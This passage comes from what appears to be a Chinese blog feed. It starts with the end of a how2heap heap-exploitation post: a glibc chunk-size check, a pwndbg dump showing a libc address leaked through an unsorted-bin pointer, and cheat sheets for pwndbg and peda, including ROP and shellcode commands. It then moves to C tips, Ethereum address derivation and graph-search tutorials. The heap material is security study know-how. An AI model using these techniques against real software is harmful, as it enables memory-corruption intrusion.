(__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (chunksize_nomask (victim)<br>                         &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span><br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b88</span>      <span class="hljs-number">0x00007fffff3f3b88</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p><h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp">file 路径　-　附加文件<br><span class="hljs-keyword">break</span> *<span class="hljs-number">0x400100</span> (b main) - 在 <span class="hljs-number">0x400100</span> 处下断点<br>tb  - 一次性断点<br>info b - 查看断点信息<br>enable   -   激活断点<br>disable  -   禁用断点<br><span class="hljs-keyword">delete</span> [number]  -  删除断点<br>watch *(<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x08044530</span>  -  在内存<span class="hljs-number">0x0804453</span>处的数据改变时stop<br>p $eax - 输出eax的内容<br><span class="hljs-built_in">set</span> $eax=<span class="hljs-number">4</span> - 修改变量值<br><br>c - 继续运行<br>r - 开始运行<br>ni - 单步步过<br>si - 单步步入<br>fini - 运行至函数刚结束处<br><span class="hljs-keyword">return</span> expression - 将函数返回值指定为expression<br>bt - 查看当前栈帧<br>info f - 查看当前栈帧<br>context - 查看运行上下文<br><span class="hljs-built_in">stack</span> - 查看当前堆栈<br>call func - 强制函数调用<br><span class="hljs-built_in">stack</span> <span class="hljs-number">100</span> - 插件提供的，显示栈中<span class="hljs-number">100</span>项<br>find xxx　 - 快速查找，很实用<br><br>x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。<br>x /<span class="hljs-number">4</span>xg $ebp：查看ebp开始的<span class="hljs-number">4</span>个<span class="hljs-number">8</span>字节内容<br>x/wx $esp 　　以<span class="hljs-number">4</span>字节<span class="hljs-number">16</span>进制显示栈中内容<br>b表示单字节，h表示双字节，w表示四字 节，g表示八字节<br>s 按字符串输出<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>i：反汇编<br><br>但是实际的组合就那么几种：<br>x/s 地址　　查看字符串<br>x/wx 地址　　查看DWORD<br>x/c 地址　　单字节查看<br>x/<span class="hljs-number">16</span>x $esp+<span class="hljs-number">12</span> 查看寄存器偏移<br><br><span class="hljs-built_in">set</span> args  - 可指定运行时参数。（如：<span class="hljs-built_in">set</span> args <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span>）<br>show args  - 命令可以查看设置好的运行参数。<br></code></pre></td></tr></table></figure><h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul><li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li></ul><p>gdb-peda$ aslr ASLR is OFF</p><ul><li>checksec - 检查二进制文件的各种安全选项</li></ul><p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p><ul><li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li><li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li><li>elfheader - 从被调试的 ELF 文件中获取标题信息</li><li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li><li>lookup - 搜索所有地址/参考地址属于一个内存范围</li><li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li><li>procinfo - 显示/ proc / pid /</li><li>pshow - 显示各种 PEDA 选项和其他设置</li><li>pset - 设置各种 PEDA 选项和其他设置</li><li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul><li>pattern create size 生成特定长度字符串</li><li>pattern offset value 定位字符串</li></ul></li><li>procinfo – Display various info from /proc/pid/</li><li>pshow – Show various PEDA options and other settings</li><li>pset– Set various PEDA options and other settings</li><li>readelf - 从 ELF 文件获取标题信息</li><li>ropgadget - 获取二进制或库的通用 ROP 小工具</li><li>ropsearch - 在内存中搜索 ROP 小工具</li><li>searchmem - 用搜索内存<ul><li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li></ul></li><li>shellcode - 生成或下载常用的 shellcode。</li><li>skeleton - 生成 python 漏洞利用代码模板</li><li>vmmap - 可以用来查看栈、bss 段是否可以执行</li><li>xormem - 用一个键异或存储区域</li><li>ptype struct link_map - 查看 link_map 定义</li><li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li></ul><h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT算法刷题(2)</title>
      <link href="/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)/"/>
      <url>/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622043047928-fdfd5cca-83fe-415e-8130-2473806b67be.png#clientId=u4e2ecc72-0b61-4&from=paste&height=80&id=u74d31445&name=image.png&originHeight=160&originWidth=1066&originalType=binary%E2%88%B6=1&size=160064&status=done&style=none&taskId=ube714c6b-8abc-4802-833e-8c45fb5800e&width=533" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622043066255-5db7ee69-6ca8-43cd-a52d-abd13ebb6abb.png#clientId=u4e2ecc72-0b61-4&from=paste&height=61&id=u5201477b&name=image.png&originHeight=122&originWidth=1067&originalType=binary%E2%88%B6=1&size=134720&status=done&style=none&taskId=u0092dfb5-b66b-4a05-aeb6-8f6dcb75222&width=533.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622044106942-f18df800-b653-48d6-b08b-c7c1190c1651.png#clientId=u4e2ecc72-0b61-4&from=paste&height=295&id=ucedf3117&name=image.png&originHeight=590&originWidth=736&originalType=binary%E2%88%B6=1&size=388439&status=done&style=none&taskId=u418c5398-37ca-45e4-890a-f7389a9b005&width=368" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622044120723-af185276-2399-465f-82e5-445177ea700b.png#clientId=u4e2ecc72-0b61-4&from=paste&height=174&id=u5ad65c12&name=image.png&originHeight=348&originWidth=1082&originalType=binary%E2%88%B6=1&size=336793&status=done&style=none&taskId=ubbb32c63-b028-443d-b148-9eac916a2f7&width=541" alt="image.png"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链账户地址相关问题</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="私钥、公钥和地址是如何生成的？"><a href="#私钥、公钥和地址是如何生成的？" class="headerlink" title="私钥、公钥和地址是如何生成的？"></a>私钥、公钥和地址是如何生成的？</h1><p>以太坊地址生成的流程也是：私钥 -&gt; 公钥 -&gt; 地址。因此地址的生成需要三步：</p><ol><li>生成一个随机的私钥（32 字节）-64 位的 16 进制字符</li><li>通过私钥生成公钥（64 字节）</li><li>通过公钥得到地址（20 字节）</li></ol><h2 id="第一步：私钥-private-key"><a href="#第一步：私钥-private-key" class="headerlink" title="第一步：私钥 (private key)"></a>第一步：私钥 (private key)</h2><p>伪随机数产生的 256bit 私钥示例(256bit  16 进制 32 字节)<br><code>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</code></p><h2 id="第二步：公钥-public-key"><a href="#第二步：公钥-public-key" class="headerlink" title="第二步：公钥 (public key)"></a>第二步：公钥 (public key)</h2><ol><li>采用椭圆曲线数字签名算法 ECDSA-secp256k1 将私钥（32 字节）映射成公钥（65 字节）（前缀 04+X 公钥+Y 公钥）：</li></ol><p><code>0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</code></p><ol start="2"><li>拿公钥（非压缩公钥）来 hash，计算公钥的<strong>Keccak-256</strong>哈希值（32bytes）：</li></ol><p><code>fc12ad814631ba689f7abe67**1016f75c54c607f082ae6b0881fac0abeda21781**</code></p><ol start="3"><li>取上一步结果取后 20bytes 即以太坊地址：</li></ol><p><code>1016f75c54c607f082ae6b0881fac0abeda21781</code></p><h2 id="第三步：地址-address"><a href="#第三步：地址-address" class="headerlink" title="第三步：地址 (address)"></a>第三步：地址 (address)</h2><p><code>0x1016f75c54c607f082ae6b0881fac0abeda21781</code></p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT算法刷题（1）</title>
      <link href="/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89/"/>
      <url>/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ol><li>浮点型不要用 float 定义，而要用 double 定义，因为精度问题，float 只能有效精度为 6 位左右。</li><li>ASCII 码中，小写字母比大写字母的 ASCII 码大 32，具体是 A<del>Z：65</del>90，a<del>z：97</del>122</li><li>位运算符：<ol><li>A&lt;&lt;x 左移，整数 A 按照二进制左移 x 位</li><li>a &amp; b 位与，整数 a 和 b 按二进制对齐，按照位进行<strong>与运算</strong></li><li>a | b 位或，整数 a 和 b 按二进制对齐，按照位进行<strong>或运算</strong></li><li>a ^ b 位异或，按位进行异或运算</li><li>~a，取反，整数 a 的二进制每一位取反</li></ol></li><li>scanf 的格式化输入–只记录几种不常用的<ol><li>long long 的输入 ：%lld</li><li>double 的输入： %lf</li><li>字符串（char 数组）: %s，注意，字符串输入不需要加&amp;进行取址，即 scanf(“%s”,str)是正确的。（因为数组名称本身就代表这个数组第一个元素的地址，所以不需要加取地址）</li></ol></li><li>typedef 是给复杂的数据结构起别名的<ol><li>例 1： typedef long long LL;//给 long long 起别名 LL</li></ol></li><li>一些常用的 math 函数<ol><li>floor(double x)–向下取整</li><li>ceil(double x)–向上取整</li><li>log()–用于返回以自然对数为底的对数<ol><li>注意，c 里面没有对任意底数求对数的函数，必须用换底公式 log_a{b}=log_e{b}/log_e{a}</li></ol></li><li>sin,cos,tan–三角函数，必须是弧度制，即 pi/2 一类的</li><li>asin,acos–返回 double 的三角函数值</li></ol></li><li>switch</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(表达式)&#123;<br>    <span class="hljs-keyword">case</span> 常量结果<span class="hljs-number">1</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> 结果<span class="hljs-number">2</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        ....<br>&#125;<br></code></pre></td></tr></table></figure><ol start="8"><li>数组初始化<ol><li>比如 <code>int a[10] = &#123;0&#125;;</code>就可以把整个数组都赋值 0，或者<code>int a[10] = &#123;&#125;;</code>也可以做到</li><li>如果数组大小在 10 的 6 次方以上，需要将其定义在主函数之外，即静态存储区申请空间，如<code>int a[1000000];</code></li><li>memset-对数组中每个元素赋值相同值<ol><li>memset(数组名，值，sizeof(数组名))</li><li>建议只使用 memset 赋值 0 和-1，因为它是按字节赋值，比如 int 是 4 个字节</li><li>对于数组赋予其他值（比如 1），请使用 fill 函数</li></ol></li></ol></li><li>gets 识别\n 作为输入结束，因此使用 scanf 接收完之后，如果要使用 gets，需要先用 getchar()接收整数后的换行符</li><li>strlen()–字符串长度</li><li>strcmp(char a[].char b[])–字符串比较</li><li>strcpy(char a[].char b[])–把 b 字符串数组赋给 a 数组</li><li>字符串处理利器</li><li>sscanf(char str[],”%d”,&amp; int n)–把字符串数组的内容以%d 的格式写到变量 n 中–从左到右</li><li>sprintf(char str[],”%d”,int n)–把整型变量 n 以%d 的格式写到 str 数组中，从右到左</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图搜索算法学习</title>
      <link href="/2021/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：<strong>深度优先搜索(Depth First Search, DFS)**、</strong>广度优先搜索(Breadth First Search, BFS)<strong>。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：</strong>贪婪最佳优先算法*<em>(<strong>Greedy Best First Search, GBFS</strong>)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：<strong>Dijkstra 算法</strong>、**A\</em>算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。</p><a id="more"></a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>下面切入正题，图搜索算法的基本流程如下：</p><ul><li>创建一个容器，一般称为<strong>openlist</strong>，用来存储将要访问的节点</li><li>将起点加入容器</li><li>开始循环：</li><li>—- 弹出：从容器中取出一个节点</li><li>—- 扩展：获取该节点周围的节点，将这些节点放入容器</li></ul><p>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h3 id="图结构的邻接矩阵表示法"><a href="#图结构的邻接矩阵表示法" class="headerlink" title="图结构的邻接矩阵表示法"></a>图结构的邻接矩阵表示法</h3><p><strong>邻接矩阵</strong>用来表示图的边集，即节点间的相邻关系集合。设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276356-ada93f8f-d8ba-4f17-98ec-9af058cd477f.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc6664d&originHeight=26&originWidth=102&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u8e0433de-cbce-4ed5-b260-4e2f71ad8c0&width=51"> 是一个具有 n 个节点的图，它的邻接矩阵是一个 n 阶矩阵，则其中的元素 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276341-89563210-0b27-48f5-992c-5bc26999cdaa.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=udc2dd334&originHeight=21&originWidth=24&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u2df13e1a-f9b8-4281-823a-168ccdf6e50&width=12"> 满足：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276458-8544ee65-c78e-4aee-9945-379503d2b2ca.svg#clientId=u4512e8b3-315c-4&from=paste&height=34&id=ubaaea0f0&originHeight=68&originWidth=432&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ud90780c7-8c45-4351-afd3-b4a40e55462&width=216"><br>对于无向图，其邻接矩阵是对称矩阵，即 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276360-06638203-15d1-4db8-9832-91cda47c94af.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=u782dacff&originHeight=21&originWidth=77&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u190fa9eb-a53b-4d83-b57a-bcaa10caa34&width=38.5"> ，而有向图的邻接矩阵不一定对称，其空间复杂度均为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276368-54baba56-84e8-456e-9a3a-2228ee191d73.svg#clientId=u4512e8b3-315c-4&from=paste&height=15&id=u082a2bca&originHeight=29&originWidth=54&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u3f3f3403-8b0c-41d0-9d2a-a53d9cf6fb2&width=27"> 。以下为两个不带权图的邻接矩阵示例：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620725277081-b458dd5a-f419-4d14-87c8-95fb686baded.jpg#clientId=u4512e8b3-315c-4&from=paste&height=146&id=u6d0c1531&originHeight=291&originWidth=300&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ua9947cb2-a6f0-4a06-b876-917c53e91ed&width=150"><br>对于<strong>带权图</strong>，设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276919-e8f40e24-f907-48d0-9439-9c210e6637b7.svg#clientId=u4512e8b3-315c-4&from=paste&height=14&id=ucc327eee&originHeight=27&originWidth=71&originalType=url%E2%88%B6=1&status=done&style=none&taskId=udc0d541f-3cdf-48fb-bd16-1da62d51156&width=35.5"> 或者 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276928-11917431-d782-4dbc-afcd-7d8bfe260858.svg#clientId=u4512e8b3-315c-4&from=paste&height=8&id=u386178d2&originHeight=15&originWidth=10&originalType=url%E2%88%B6=1&status=done&style=none&taskId=uf489f51a-13af-43ec-ba53-deea1911e98&width=5"> 上的权值为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725277029-5536e091-2e54-43da-acfc-3aee813c2193.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=uaf1ce0d4&originHeight=21&originWidth=28&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u0cdccce9-6f0a-43c0-87fe-f34571b4c94&width=14"> ，则带权图的邻接矩阵定义为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725277124-8b7317db-c5ca-4d46-a5ae-ee29c92aa15f.svg#clientId=u4512e8b3-315c-4&from=paste&height=48&id=u5b09c490&originHeight=95&originWidth=452&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u09279262-4765-43c1-8607-7946ed5add6&width=226"><br>以下为两个带权图的邻接矩阵示例：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620725277794-f6649aa8-0c37-4e16-9350-5199f120a3d8.jpg#clientId=u4512e8b3-315c-4&from=paste&height=156&id=ue0476deb&originHeight=312&originWidth=300&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ub5290b0d-99b5-4ace-9bc6-458f46faf37&width=150"></p><h2 id="深度优先搜索-DFS"><a href="#深度优先搜索-DFS" class="headerlink" title="深度优先搜索(DFS)"></a>深度优先搜索(DFS)</h2><p>深度优先，顾名思义即深度越大的节点会被优先扩展。在 DFS 中，使用<strong>栈(Stack)**数据结构来实现上述特性。<br>栈是一种</strong>后进先出(LIFO)<strong>的容器，如下图<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721476833-5c0f21cd-d22b-4e50-b3f7-950f7c4150ae.jpg#clientId=u4512e8b3-315c-4&from=paste&height=187&id=ub038a80c&originHeight=229&originWidth=252&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u32928bb0-c0d9-4527-918f-e65db8c6619&width=206"><br>以在下面的</strong>无权图**中找到从节点 a 到节点 i 的路径为例，说明一下 DFS 算法的工作流程<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721500508-f381f6fe-f5c0-4c0e-be57-f8aaf29aa62b.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u70b5387b&originHeight=274&originWidth=368&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u2ec2716b-c4cd-49e2-8c58-e23e99018da&width=184"><br>按照上节的图搜索算法的基本流程进行搜索，过程如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721500444-5216c34f-4bd3-4da8-b399-60ad9af2497e.jpg#clientId=u4512e8b3-315c-4&from=paste&height=118&id=ue3f3c139&originHeight=236&originWidth=1277&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u0dcdaa19-58a5-4b08-b306-9e472773c16&width=638.5"><br>从 i 回溯得到路径：a-&gt;b-&gt;c-&gt;g-&gt;i，如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721511535-fa575ccb-4d20-4c13-8e7d-5bac3730ad27.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u449947f3&originHeight=273&originWidth=367&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u2b885412-dc7b-4b20-ac5a-b819ab82efd&width=183.5"></p><h2 id="广度优先搜索-BFS"><a href="#广度优先搜索-BFS" class="headerlink" title="广度优先搜索(BFS)"></a>广度优先搜索(BFS)</h2><p>与 DFS 的“不撞南墙不回头”的个性不同，BFS 在搜索时呈<strong>波状推进</strong>形式，一路稳扎稳打，它是一种<strong>以时间换空间</strong>的方法，能够保证搜索到的路径是最优的。<br>为了实现波状推进搜索特性，BFS 采用<strong>队列(Queue)**作为 openlist 的数据结构。队列是一种</strong>先进先出(FIFO)**的容器，如下图<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721616028-44f0bacf-fb40-43e6-9ef3-a8c20bddd15e.jpg#clientId=u4512e8b3-315c-4&from=paste&height=88&id=ud12a1bda&originHeight=175&originWidth=643&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u3a1b1346-f237-46b8-9d09-a3b4054e02d&width=321.5"><br>其流程与上节中 DFS 类似，继续以上节的图举例，过程如下，首先创建一个队列作为容器，将节点 a 加入队列</p><p><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721670683-20cf690f-9d76-42e1-a413-454d66a4959d.jpg#clientId=u4512e8b3-315c-4&from=paste&height=54&id=uac838178&originHeight=108&originWidth=744&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ufb837890-53a7-4c8a-b201-4f00e37582e&width=372"><br>接着将节点 a 弹出队列，将节点 a 周围没有访问过的节点加入队列<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721670728-e2969e08-bfb3-4fb4-a0c8-1537865c105b.jpg#clientId=u4512e8b3-315c-4&from=paste&height=84&id=u1a3884c7&originHeight=168&originWidth=752&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u06bcf717-b733-4fe0-a0e8-e47485993d0&width=376"><br>按照上面的流程不断地<strong>弹出、扩展</strong>节点，直到找到节点 i 为止，完整流程如下图：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620721670667-42127cbe-2295-41cd-95f9-1f0fb37214da.jpg#clientId=u4512e8b3-315c-4&from=paste&height=384&id=u4b228bb6&originHeight=768&originWidth=752&originalType=url%E2%88%B6=1&status=done&style=none&taskId=uf69ba2e0-88b1-4285-8540-21d9787fb80&width=376"><br>从终点回溯，i 的父节点为 f，f 的父节点为 e，e 的父节点为 a，这样就可以得到 a 到 i 的最短路径为：a-&gt;e-&gt;f-&gt;i，如下<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1620721671023-ad7e00d0-c903-44a3-8727-5e648042ccfd.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=200&id=u9d7c5033&originHeight=399&originWidth=720&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ube00c3d7-c002-4c0a-9de2-74816c1441b&width=360"><br>显而易见，相较于 DFS，BFS 中使用了大量的入队、出队操作，耗时增加，但是能保证找到最优路径。</p><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><p>上面的算法中，只有广度优先搜索(BFS)具有完备性，能够保证搜索到最优路径。但是可以看到 BFS 算法搜索到的路径只有向上/下/左/右移动这四个动作，它们是没有权值或者说权值都相同的，只能用于无权图的路径规划，无法实现能够对角移动的路径规划。因此下面介绍一种能用于带权图的图搜索算法——Dijkstra 算法(狄克斯特拉算法)。<br>Dijkstra 算法是从一个顶点到其余各顶点的最短路径算法，其流程仍然与上述算法基本一致，它也是用优先队列作为 openlist 的数据结构，它和 GBFS 的区别在于代价函数<img 